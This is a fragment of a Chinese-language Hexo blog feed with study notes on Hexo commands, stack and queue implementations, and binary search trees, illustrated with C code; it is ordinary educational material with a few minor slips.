<li><p>生成博客：<code>hexo new &quot;md文件名称&quot;</code></p>
<p>生成的博客文件在建站文件夹目录下<code>.\source\_posts</code>目录下</p>
</li>
<li><p>更新： <code>hexo clean</code>           <code>hexo g</code></p>
</li>
<li><p>本地加载：<code>hexo s</code></p>
<p>会加载到<a href="http://localhost:4000/下" target="_blank" rel="noopener">http://localhost:4000/下</a></p>
</li>
<li><p>推到远端： <code>hexo d</code></p>
</li>
<li><p>网站配置信息：在建站文件夹目录下的_config.yml文件</p>
<p>可以在此配置大部分的参数。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>相关配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>堆栈和队列</title>
    <url>/2020/02/12/%E5%A0%86%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        堆栈和队列都是比较基本的数据结构，也是程序员应该掌握的结构，它们简单而又有用，以此，记录一下学习过程。</p>
<a id="more"></a>

<h1 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h1><p>​        堆栈是比较基本的ADT(抽象数据类型)，这种结构最鲜明的特点就是List-In First-Out，LIFO方式。</p>
<h2 id="堆栈接口"><a href="#堆栈接口" class="headerlink" title="堆栈接口"></a>堆栈接口</h2><p>​        一般来说，传统的堆栈操作就是push和pop。</p>
<p>​        push就是把一个新值压入到堆栈顶部，pop就是把堆栈顶部的值移出堆栈并返回这个值。堆栈只提供对它顶部元素的访问。</p>
<p>​        但是，用于访问堆栈顶部元素只有pop操作，且这个元素还要被弹出堆栈。</p>
<p>​        所以要使用另一种堆栈接口，其含有三种基本操作push，pop和top：</p>
<p>​        push和传统堆栈一样，而pop只是将堆栈顶的值弹出，并不返回这个值，而top的操作就是返回堆栈顶元素的值，它并不把顶部元素从堆栈中移除。</p>
<p>​        同时，一个空的堆栈不支持pop操作，所以需要一个is_empty函数查看堆栈是否为空，同理，一个满的堆栈不支持push操作，需要一个is_full函数查看堆栈是否为满。</p>
<h2 id="实现堆栈"><a href="#实现堆栈" class="headerlink" title="实现堆栈"></a>实现堆栈</h2><p>​        所有的ADT都必须确定一件事，那就是内存分配，如何获取内存来储存值。有三种可选的方案：静态数组，动态分配的数组，以及动态分配的链式结构。</p>
<p>​        静态数组要求长度固定，而且这个长度在编译使就已经确定。但是这个方案最简单也最不容易出错。</p>
<p>​        动态数组可以在运行时才决定数组的长度。而且，需要的话，可以分配一个新的，更大的数组。把原先的数组的值复制到新的数组中，然后删除掉原先数组，从而达到动态增长数组大小的目的。</p>
<p>​        最后链式结构提供的最大程度上的灵活性。每个元素在需要时候才单独分配，所以除非超过机器内存大小的限制外，这种方式对元素数量没有什么限制。不过，链式结构在访问下一元素的时候需要消耗一定的内存空间，而且在访问一个特定的元素时候的效率不如数组。</p>
<p>下述代码正式用链式结构对堆栈的实现，其他两种同理也可以比较简单的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 堆栈模块的接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_TYPE int <span class="comment">/*堆栈所储存的类型*/</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* push 把一个新值压入到堆栈中 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(STACK_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pop 从堆栈中弹出一个值，并丢弃 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* top 返回堆栈顶部元素，但对堆栈不进行修改 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">STACK_TYPE <span class="title">top</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* is_empty 如果堆栈为空，则返回true，否则，返回false */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_empty</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* is_full 如果堆栈为满，则返回true，否则，返回false */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_full</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>stack.h文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 一个用链表实现的堆栈，这个堆栈没有长度限制。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stack.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 定义一个结构用来储存堆栈元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">STACK_NODE</span> &#123;</span></span><br><span class="line">    STACK_TYPE value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">STACK_NODE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; StackNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 指向堆栈中第一个节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> StackNode *<span class="built_in">stack</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* destroy_stack</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">destroy_stack</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(!is_empty())</span><br><span class="line">        pop();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* push</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(STACK_TYPE value)</span></span>&#123;</span><br><span class="line">    StackNode *new_node;</span><br><span class="line"></span><br><span class="line">    new_node = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));</span><br><span class="line">    assert(new_node != <span class="literal">NULL</span>);</span><br><span class="line">    new_node-&gt;value = value;</span><br><span class="line">    new_node-&gt;next = <span class="built_in">stack</span>;</span><br><span class="line">    <span class="built_in">stack</span> = new_node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* pop</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    StackNode *first_node;</span><br><span class="line"></span><br><span class="line">    assert(!is_empty());</span><br><span class="line">    first_node = <span class="built_in">stack</span>;</span><br><span class="line">    <span class="built_in">stack</span> = first_node-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(first_node);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">STACK_TYPE <span class="title">top</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    assert(!is_empty());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* is_empty</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_empty</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span> == <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* is_full</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_full</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><p>​        队列同样是比较基本的ADT，这种结构和堆栈不同的是，其特点是First-In First-Out，FIFO方式。</p>
<h2 id="队列接口"><a href="#队列接口" class="headerlink" title="队列接口"></a>队列接口</h2><p>​        事实上队列并没有像堆栈那样具有约定俗成的用法，不过原理上队列都是一样，在这里我们用insert和delete来表示插入和删除，以及队列的方向是从队尾进入，从队首弹出。</p>
<p>​        队列也有insert+delete的用法，以及insert+delete+first的用法，和上述堆栈中差不多，也就不细说了。</p>
<h2 id="实现队列"><a href="#实现队列" class="headerlink" title="实现队列"></a>实现队列</h2><p>​        队列的实现有些和堆栈不同，队列需要两个指针，一个指向队首front，一个指向队尾rear。同时，一般的数组并不适合队列，这是因为队列使用内存的方式引起的。堆栈数据总是扎很于一端，而队列需要对数据进行挪移。</p>
<p>​        在实现队列时，可以用到循环数组实现：</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qs2z8.png" alt="1qs2z8.png"></p>
<p>再插入一个新的元素就为：</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qs7iq.png" alt="1qs7iq.png"></p>
<p>这种循环数组很容易实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">rear += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (rear &gt;= QUEUE_SIZE)</span><br><span class="line">    rear = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>或者：</p>
<p><code>rear = (rear + 1) % QUEUE_SIZE</code></p>
<p>同理，对front也是一样的计算。</p>
<p><strong>但是，</strong>这样的循环数组具有一个问题——那就是对队列为空和为满时候两种情况的front和rear是一样的。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q6ZcT.png" alt="1q6ZcT.png"></p>
<p>​                                                            向队列中不断添加元素使之为满。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q6ja9.png" alt="1q6ja9.png"></p>
<p>​                                                            从队列中不断释放元素使之为空。</p>
<p>​        这样的问题一种解决办法就是设置一个变量，这个变量用于记录队列大小。</p>
<p>​        还有一种解决方法，那就是重新定义 ‘ 满 ‘ 的含义，在队列中插入时剩一个元素的时候就为满了，这样在满的时候和空的时候front和rear的值就不一样了。</p>
<p>​        因为只定义了 ‘ 满 ‘ 的含义，那么队列为空的时候还是原先的判别条件：</p>
<p><code>(rear + 1) % QUEUE_SIZ = front</code></p>
<p>​        队列为满的时候，还保留一个元素未使用，所以在满的时候判别条件就为：</p>
<p> <code>(rear + 2) % QUEUE_SIZE = front</code></p>
<p>​        这样就把这两种情况区分开了。</p>
<p><strong>链表实现</strong></p>
<p>​        上述所说的是队列使用线性结构数组的实现方式，在队列中，还可以使用链式结构——链表去实现，因为是动态分配了新元素的内存，只要不受机器内存大小的限制，理论上队列不存在为满的情况。</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1q4Kte.png" alt="1q4Kte.png"></p>
<pre><code>链表实现图</code></pre>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>c语言</tag>
        <tag>堆栈</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉搜索树</title>
    <url>/2020/02/06/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/</url>
    <content><![CDATA[<h1 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h1><blockquote>
<p><strong>树的递归定义：</strong></p>
<p>树是一种数据结构，它要么为空，要么具有一个值并具有零个或多个<strong>孩子</strong>，每个孩子本身也是一个树。</p>
</blockquote>
<a id="more"></a>

<p>二叉树是树的特殊形式，它的每个节点至多有两个孩子，分别称作<strong>左孩子</strong>和<strong>右孩子</strong>。</p>
<p>二叉搜索树还具有一个额外的性质：每个节点的值比它的左子树的所有节点的值都要大，但比它的右子树的所有节点的值都要小。</p>
<p>注意：这个定义排除了树中存在值相同的节点可能</p>
<p>这使得二叉搜索树成为一种用关键值快速查找的工具，它的查找时间复杂度可为<strong>O(log n)</strong>，因为它是用到二分法快速锁定关键值。</p>
<p><img src="https://s2.ax1x.com/2020/02/12/17Ilct.png" alt="17Ilct.png"></p>
<p>​                                                                                （二叉搜索树）</p>
<h2 id="在二叉搜索树的插入"><a href="#在二叉搜索树的插入" class="headerlink" title="在二叉搜索树的插入"></a>在二叉搜索树的插入</h2><p>​    当一个新值添加到一颗二叉搜索树时，它必须被放在合适的位置，继续保持二叉搜索树的属性。</p>
<p>插入的基本算法：</p>
<blockquote>
<p>​    <em>如果树为空：</em></p>
<p>​            <em>把新值作为根节点插入</em></p>
<p>​    <em>否则：</em></p>
<p>​            <em>如果新值小于当前节点的值：</em></p>
<p>​                    <em>把新值插入到当前节点的左子树中</em></p>
<p>​            <em>否则：</em></p>
<p>​                    <em>把新值插入到当前节点的右子树中</em></p>
</blockquote>
<p>上述算法的<strong>递归表达</strong>正是对树的<strong>递归定义</strong>的直接结果。</p>
<p>( 注意：由于上述递归在算法的尾部出现&lt;尾部递归&gt;，所以我们可以用到迭代跟有效的实现这个算法 )</p>
<h2 id="从二叉搜索树删除节点"><a href="#从二叉搜索树删除节点" class="headerlink" title="从二叉搜索树删除节点"></a>从二叉搜索树删除节点</h2><p>​        从树的中部删除一个节点将会导致节点的子树和树的其余部分分离，我们必须重新连接它们。</p>
<p>所以从二叉搜索树删除节点分三种情况：</p>
<ol>
<li>删除节点为叶节点，则直接删除叶节点不会导致任何子树断开，所以不存在重新连接问题。</li>
<li>删除节点只有一个孩子，则删除节点只需要将删除节点的父节点和它的孩子节点连接起来即可。</li>
<li>删除节点具有两个孩子，则其中一种策略是找到该节点左子树的最大值，并将最大值节点删除，同时用这个最大值代替原先要删除那个节点的值。</li>
</ol>
<h2 id="在二叉搜索树中查找"><a href="#在二叉搜索树中查找" class="headerlink" title="在二叉搜索树中查找"></a>在二叉搜索树中查找</h2><p>​        根据二叉搜索树本身特性，则在树中查找值并不困难：</p>
<blockquote>
<p><em>如果树为空：</em></p>
<p>​        <em>这个值不在树中</em></p>
<p><em>否则：</em></p>
<p>​        <em>如果这个值和根节点的值相同:</em></p>
<p>​                <em>成功找到这个值</em></p>
<p>​        <em>否则：</em></p>
<p>​                <em>如果这个值小于根节点的值:</em></p>
<p>​                        <em>查找左子树</em></p>
<p>​                <em>否则：</em></p>
<p>​                        <em>查找右子树</em></p>
</blockquote>
<p>这个递归算法也属于<strong>尾部递归</strong>，所以采用迭代的方案更具效率。</p>
<h2 id="在二叉搜索树中遍历"><a href="#在二叉搜索树中遍历" class="headerlink" title="在二叉搜索树中遍历"></a>在二叉搜索树中遍历</h2><p>​        当你在检查这棵树的所有节点时，就是在遍历这棵树。</p>
<p>​        遍历树的节点有几种不同的遍历方式：前序，中序，后序，以及层次遍历。</p>
<p><img src="https://s2.ax1x.com/2020/02/12/1HU0Wd.png" alt="1HU0Wd.png"></p>
<p>上图所描述的树的前序遍历为：20，12，5，16，25，28 （中-&gt;左-&gt;右）</p>
<p>中序遍历为：5，12，16，20，25，28（左-&gt;中-&gt;右）</p>
<p>后序遍历为：5，16，12，28，25，10（左-&gt;右-&gt;中）</p>
<p>层次遍历为：20，12，25，5，16，28</p>
<h2 id="二叉搜索树的接口文件"><a href="#二叉搜索树的接口文件" class="headerlink" title="二叉搜索树的接口文件"></a>二叉搜索树的接口文件</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">**二叉搜索树的接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TREE_TYPE int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* TreeNode 结构包含了值和两个指向某个树节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> &#123;</span></span><br><span class="line">    TREE_TYPE value;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TREE_NODE</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125; TreeNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*insert 向树种插入一个新值，参数是需要被添加的值，它必须是树中没有的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*find 查找一个值，这个值作为参数传递给函数，返回这个值的地址，若无，则返回NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE *<span class="title">find</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*max 查找树中最大值，也就是树的最有叶节点的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE <span class="title">max_tree</span><span class="params">(TreeNode *link)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*remove 删除一个值，这个值作为参数传递给函数，它必须是树中具有的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_value</span><span class="params">(TREE_TYPE value)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*pre_order_traverse</span></span><br><span class="line"><span class="comment">*执行树的前序遍历，参数是一个回调函数指针，它所指向的函数将在树中处理每个节点被调用</span></span><br><span class="line"><span class="comment">*节点的值作为被调函数的参数</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pre_order_traverse</span><span class="params">(<span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>;</span><br></pre></td></tr></table></figure>

<p>tree.h文件</p>
<h2 id="二叉搜索树的线性结构"><a href="#二叉搜索树的线性结构" class="headerlink" title="二叉搜索树的线性结构"></a>二叉搜索树的线性结构</h2><p><strong>数组形式的二叉搜索树</strong></p>
<p>用数组形式去实现二叉搜索树的关键是使用下标寻找节点的父节点和孩子节点。</p>
<p>下面有两套映射规则：</p>
<blockquote>
<p><em>基于根节点为节点1，且数组从1开始的映射规则</em></p>
<p>​        节点N的父节点为节点N/2</p>
<p>​        节点N的左孩子节点为节点2N</p>
<p>​        节点N的右孩子节点为节点2N+1</p>
</blockquote>
<blockquote>
<p><em>基于根节点为节点0，且数组从0开始的映射规则</em></p>
<p>​        节点N的父节点为节点(N+1)/2 - 1</p>
<p>​        节点N的左孩子节点为节点2N+1</p>
<p>​        节点N的右孩子节点为节点2N+2</p>
</blockquote>
<p>上述两套规则都可以实现用数组来表示二叉搜索树</p>
<p>​        第一套可读性高，且符合现实习惯，但数组下标从1开始忽略了数组第一个元素的空间，在面对树中储存元素较大时浪费了空间。</p>
<p>​        在用数组实现二叉搜索树时，如何对未使用的数组元素初始化来表示该节点未使用也未赋值，用0表示也是一种方式，但0也是一个合法的数据值，这个时候就可以使用一个比较数组，它的元素是布尔类型，用于提示哪个节点被使用。</p>
<p>​        <strong>缺陷：无论是静态数组，还是动态数组来实现二叉搜索树，都会存在一个问题，那就是面对不是那么平衡树来说，往往会浪费很大的空间，而且每次的新插入会使数组大小扩大一倍，这样使可用空间迅速耗尽。</strong></p>
<h2 id="二叉搜索树的链式结构"><a href="#二叉搜索树的链式结构" class="headerlink" title="二叉搜索树的链式结构"></a>二叉搜索树的链式结构</h2><p>最为常见的二叉搜索树实现方式，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*使用动态分配的链式结构实现二叉搜索树</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tree.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">*指向树根节点的指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> TreeNode *tree;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* insert</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link = &amp;tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((current = *link) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(value != current-&gt;value);</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *分配一个新的节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    current = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TreeNode));</span><br><span class="line">    assert(current != <span class="literal">NULL</span>);</span><br><span class="line">    current-&gt;value = value;</span><br><span class="line">    current-&gt;left = <span class="literal">NULL</span>;</span><br><span class="line">    current-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line">    *link = current;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* find</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE *<span class="title">find</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current = tree;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span> &amp;&amp; current-&gt;value != value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(value &lt; current-&gt;value)</span><br><span class="line">            current = current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            current = current-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(current != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> &amp;current-&gt;value;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* max_tree</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">TREE_TYPE <span class="title">max_tree</span><span class="params">(TreeNode *link)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (link-&gt;right != <span class="literal">NULL</span>)</span><br><span class="line">        link = link-&gt;right;</span><br><span class="line">    <span class="keyword">return</span> link-&gt;value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* remove</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_value</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">    TreeNode *current;</span><br><span class="line">    TreeNode **link = &amp;tree;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *寻找节点</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">while</span> ((current = *link)-&gt;value != value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value &lt; current-&gt;value)</span><br><span class="line">            link = &amp;current-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            assert(value != current-&gt;value);</span><br><span class="line">            link = &amp;current-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *删除节点，分三种情况</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> &amp;&amp; current-&gt;right == <span class="literal">NULL</span>)</span><br><span class="line">       *link = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span> || current-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;left == <span class="literal">NULL</span>)</span><br><span class="line">            *link = current-&gt;right;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *link = current-&gt;left;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        TREE_TYPE <span class="built_in">max</span> = max_tree(current-&gt;left);</span><br><span class="line">        remove_value(<span class="built_in">max</span>);<span class="comment">/*max必为叶节点*/</span></span><br><span class="line">        current-&gt;value = <span class="built_in">max</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* do_pre_order_traverse</span></span><br><span class="line"><span class="comment">* 执行一层前遍历序。这是一个辅助函数。</span></span><br><span class="line"><span class="comment">* 并不是用户接口</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">do_pre_order_traverse</span><span class="params">(TreeNode *current, <span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        callback(current-&gt;value);</span><br><span class="line">        do_pre_order_traverse(current-&gt;left, callback);</span><br><span class="line">        do_pre_order_traverse(current-&gt;right, callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* pro_order_traverse</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pro_order_traverse</span><span class="params">(<span class="keyword">void</span> (*callback)(TREE_TYPE value))</span></span>&#123;</span><br><span class="line">    do_pre_order_traverse(tree, callback);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 测试使用pro_order_traverse(test_printf)，用于前序遍历输出树的值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_printf</span><span class="params">(TREE_TYPE value)</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    insert(<span class="number">2</span>);</span><br><span class="line">    insert(<span class="number">1</span>);</span><br><span class="line">    insert(<span class="number">3</span>);</span><br><span class="line">    remove_value(<span class="number">3</span>);</span><br><span class="line">    TREE_TYPE *k = <span class="built_in">find</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span>(k == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"not find\n"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"find %d\n"</span>, *k);</span><br><span class="line">    pro_order_traverse(test_printf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    insert(<span class="number">4</span>);</span><br><span class="line">    insert(<span class="number">0</span>);</span><br><span class="line">    insert(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"tree maximum %d\n"</span>,max_tree(tree));</span><br><span class="line">    pro_order_traverse(test_printf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>link_tree.c文件</p>
<p>测试输出：</p>
